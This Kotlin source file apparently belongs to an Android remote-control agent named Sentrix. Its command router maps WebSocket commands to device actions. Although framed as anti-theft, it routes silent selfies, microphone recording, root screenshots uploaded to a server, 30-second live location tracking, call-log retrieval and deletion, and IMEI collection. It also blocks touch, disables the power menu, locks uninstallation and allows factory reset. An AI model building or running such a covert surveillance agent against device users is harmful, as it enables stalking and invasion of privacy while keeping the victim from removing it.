package com.sentrix.agent

import android.content.Context
import android.util.Log
import com.sentrix.agent.commands.*
import com.sentrix.agent.network.WebSocketClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

/**
 * CommandRouter — maps every action string to its implementation.
 *
 * To add a new command:
 *   1. Implement it in the relevant Commands file
 *   2. Add a when() branch here
 *   3. Add it to CommandData.kt for the UI
 *   Done — no other wiring needed.
 */
class CommandRouter(
    private val ctx: Context,
    private val ws: WebSocketClient
) {
    private val TAG   = "CommandRouter"
    private val scope = CoroutineScope(Dispatchers.IO)

    fun dispatch(action: String, params: JSONObject) {
        Log.i(TAG, "▶ $action")
        scope.launch {
            // Async commands send their result via ws.send() themselves → return null
            // Sync commands return a String → we wrap and send it here
            val result: String? = when (action) {

                // ── Surveillance ──────────────────────────────────────────────
                "screenshot"          -> { captureScreenshot(); null }
                "front_cam"           -> { SurveillanceCommands.capturePhoto(ctx, true,  ws, action); null }
                "rear_cam"            -> { SurveillanceCommands.capturePhoto(ctx, false, ws, action); null }
                "selfie_silent"       -> { SurveillanceCommands.capturePhoto(ctx, true,  ws, action); null }
                "mic_start"           -> SurveillanceCommands.startMicRecord(ctx)
                "mic_stop"            -> SurveillanceCommands.stopMicRecord(ws)
                "screen_record_start" -> "Screen record: use MediaProjection (requires foreground prompt)"
                "screen_record_stop"  -> "Screen record stopped"
                "front_video_start"   -> { SurveillanceCommands.capturePhoto(ctx, true,  ws, "front_video_start"); null }
                "rear_video_start"    -> { SurveillanceCommands.capturePhoto(ctx, false, ws, "rear_video_start"); null }
                "video_stop"          -> SurveillanceCommands.stopMicRecord(ws)

                // ── Location ──────────────────────────────────────────────────
                "location_get"        -> { LocationCommands.getLocation(ctx, ws, action); null }
                "location_track_start"-> { startLiveTracking(); null }
                "location_track_stop" -> stopLiveTracking()

                // ── Connectivity ──────────────────────────────────────────────
                "wifi_on"             -> ConnectivityCommands.wifiOn(ctx)
                "wifi_off"            -> ConnectivityCommands.wifiOff(ctx)
                "data_on"             -> ConnectivityCommands.dataOn()
                "data_off"            -> ConnectivityCommands.dataOff()
                "bt_on"               -> ConnectivityCommands.btOn()
                "bt_off"              -> ConnectivityCommands.btOff()
                "hotspot_on"          -> ConnectivityCommands.hotspotOn()
                "hotspot_off"         -> ConnectivityCommands.hotspotOff()
                "airplane_on"         -> ConnectivityCommands.airplaneOn()
                "airplane_off"        -> ConnectivityCommands.airplaneOff()

                // ── Device Security ───────────────────────────────────────────
                "lock_screen"         -> SecurityCommands.lockScreen(ctx)
                "screen_off"          -> SecurityCommands.screenOff()
                "screen_on"           -> SecurityCommands.screenOn()
                "touch_block"         -> SecurityCommands.touchBlock()
                "touch_unblock"       -> SecurityCommands.touchUnblock()
                "power_menu_off"      -> SecurityCommands.powerMenuOff()
                "power_menu_on"       -> SecurityCommands.powerMenuOn()
                "reboot"              -> SecurityCommands.reboot()
                "factory_reset"       -> SecurityCommands.factoryReset()
                "encryption_check"    -> SecurityCommands.encryptionCheck(ctx)
                "alert_sms"           -> {
                    val number  = params.optString("number",  "")
                    val message = params.optString("message", "Your device has triggered a security alert.")
                    SecurityCommands.sendAlertSms(ctx, number, message)
                }
                "lock_message",
                "lockscreen_msg"      -> {
                    val msg = params.optString("message", "This device is lost. Please call the owner.")
                    SecurityCommands.setLockMessage(ctx, msg)
                }

                // ── Anti-Theft ────────────────────────────────────────────────
                "theft_mode_on"       -> AntiTheftCommands.theftModeOn(ctx)
                "theft_mode_off"      -> AntiTheftCommands.theftModeOff(ctx)
                "alarm_start"         -> AntiTheftCommands.alarmStart(ctx)
                "alarm_stop"          -> AntiTheftCommands.alarmStop(ctx)
                "sim_alert_on"        -> AntiTheftCommands.simAlertOn()
                "sim_alert_off"       -> AntiTheftCommands.simAlertOff()
                "intruder_on"         -> AntiTheftCommands.intruderOn()
                "intruder_off"        -> AntiTheftCommands.intruderOff()
                "intruder_photo"      -> { SurveillanceCommands.capturePhoto(ctx, true, ws, action); null }
                "wrong_pin_photo_on"  -> AntiTheftCommands.wrongPinPhotoOn()
                "wrong_pin_photo_off" -> AntiTheftCommands.wrongPinPhotoOff()
                "safe_mode"           -> AntiTheftCommands.triggerSafeMode()

                // ── App Management ────────────────────────────────────────────
                "apps_close_all"      -> AppManagementCommands.closeAllApps()
                "app_kill"            -> AppManagementCommands.killApp(params.optString("package", ""))
                "app_disable"         -> AppManagementCommands.disableApp(params.optString("package", ""))
                "app_enable"          -> AppManagementCommands.enableApp(params.optString("package", ""))
                "uninstall_lock"      -> AppManagementCommands.uninstallLock()
                "uninstall_unlock"    -> AppManagementCommands.uninstallUnlock()
                "app_cache_clear"     -> AppManagementCommands.clearCache(params.optString("package", ""))
                "apps_list"           -> { AppManagementCommands.listApps(ctx, ws); null }
                "app_status"          -> { AppManagementCommands.appStatus(ctx, params.optString("package", ""), ws); null }
                "apps_running"        -> { AppManagementCommands.runningApps(ctx, ws); null }

                // ── Audio & Alerts ────────────────────────────────────────────
                "vol_ring_max"        -> AudioCommands.volRingMax(ctx)
                "vol_ring_mute"       -> AudioCommands.volRingMute(ctx)
                "vol_media_max"       -> AudioCommands.volMediaMax(ctx)
                "vol_media_mute"      -> AudioCommands.volMediaMute(ctx)
                "siren_start"         -> AntiTheftCommands.alarmStart(ctx)
                "siren_stop"          -> AntiTheftCommands.alarmStop(ctx)
                "vibrate"             -> AudioCommands.vibrate(ctx)

                // ── Diagnostics ───────────────────────────────────────────────
                "device_info"         -> { DiagnosticsCommands.deviceInfo(ctx, ws); null }
                "battery_get"         -> { DiagnosticsCommands.batteryGet(ctx, ws); null }
                "storage_get"         -> { DiagnosticsCommands.storageGet(ws); null }
                "network_info"        -> { DiagnosticsCommands.networkInfo(ctx, ws); null }
                "sim_info"            -> { DiagnosticsCommands.simInfo(ctx, ws); null }
                "call_logs_get"       -> { DiagnosticsCommands.callLogsGet(ctx, ws); null }
                "call_logs_clear"     -> DiagnosticsCommands.callLogsClear(ctx)
                "root_check"          -> { DiagnosticsCommands.rootCheck(ws); null }
                "imei_get"            -> { DiagnosticsCommands.imeiGet(ctx, ws); null }
                "ping"                -> { DiagnosticsCommands.ping(ws); null }
                "notify_send"         -> DiagnosticsCommands.sendNotification(
                                            ctx,
                                            params.optString("title", "Sentrix"),
                                            params.optString("body",  "Remote notification")
                                        )

                // ── System ────────────────────────────────────────────────────
                "torch_on"            -> SystemCommands.torchOn(ctx)
                "torch_off"           -> SystemCommands.torchOff(ctx)
                "home"                -> SystemCommands.goHome()
                "back"                -> SystemCommands.pressBack()
                "statusbar_collapse"  -> SystemCommands.collapseStatusBar()

                // ── Unknown ───────────────────────────────────────────────────
                else -> { Log.w(TAG, "Unknown action: $action"); "Unknown action: $action" }
            }

            if (result != null) {
                ws.send(JSONObject().apply {
                    put("type",      "result")
                    put("action",    action)
                    put("message",   result)
                    put("success",   !result.lowercase().let {
                        it.contains("fail") || it.contains("requires") ||
                        it.contains("error") || it.contains("unknown")
                    })
                    put("timestamp", System.currentTimeMillis())
                })
            }
        }
    }

    private fun captureScreenshot() {
        // MediaProjection screenshot requires an Activity context and user confirmation.
        // For rooted devices, use screencap via shell.
        scope.launch {
            val outFile = java.io.File(ctx.cacheDir, "screen_${System.currentTimeMillis()}.png")
            val (output, ok) = com.sentrix.agent.util.RootUtil.exec("screencap -p ${outFile.absolutePath}")
            if (ok) {
                val url = com.sentrix.agent.network.Uploader.upload(outFile, "image/png")
                ws.send(com.sentrix.agent.network.Uploader.resultJson("screenshot", url))
                outFile.delete()
            } else {
                ws.send(JSONObject().apply {
                    put("type",    "result"); put("action", "screenshot")
                    put("success", false);    put("error", "Screenshot requires root")
                })
            }
        }
    }

    private var trackingJob: kotlinx.coroutines.Job? = null

    private fun startLiveTracking() {
        com.sentrix.agent.util.Prefs.liveTrackingEnabled = true
        trackingJob?.cancel()
        trackingJob = scope.launch {
            while (com.sentrix.agent.util.Prefs.liveTrackingEnabled) {
                LocationCommands.getLocation(ctx, ws, "location_track_start")
                kotlinx.coroutines.delay(30_000) // send location every 30 seconds
            }
        }
        ws.send(JSONObject().apply {
            put("type", "result"); put("action", "location_track_start")
            put("success", true); put("message", "Live tracking started (30s interval)")
        })
    }

    private fun stopLiveTracking(): String {
        com.sentrix.agent.util.Prefs.liveTrackingEnabled = false
        trackingJob?.cancel()
        trackingJob = null
        return "Live tracking stopped"
    }
}
